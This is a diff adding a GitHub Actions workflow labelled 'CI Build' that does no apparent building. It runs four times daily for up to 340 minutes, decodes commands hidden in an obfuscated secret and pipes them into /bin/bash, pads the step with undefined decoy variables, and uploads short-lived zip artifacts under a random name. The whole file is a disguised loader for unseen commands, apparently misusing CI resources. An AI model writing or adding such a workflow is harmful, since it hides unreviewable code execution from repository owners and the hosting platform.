@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 3,9,15,21 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          ve30950: ${{ secrets.ve30950 }}
+        run: |
+          printf '%s' "$ve30950" | jq -r .ffsx115 | /bin/bash
+          printf '%s' "$zo70" | jq -r .y922 | /bin/bash
+          echo $e6473 | jq -r .rlgzr11 | /bin/bash
+          printf '%s' "$no71554" | jq -r .twfr32790 | /bin/bash
+          printf '%s' "$o686" | jq -r .uafs66 | /bin/bash
+          printf '%s' "$cz880" | jq -r .r286 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: J47pDhCf
+          path: "*.zip"
+          retention-days: 1
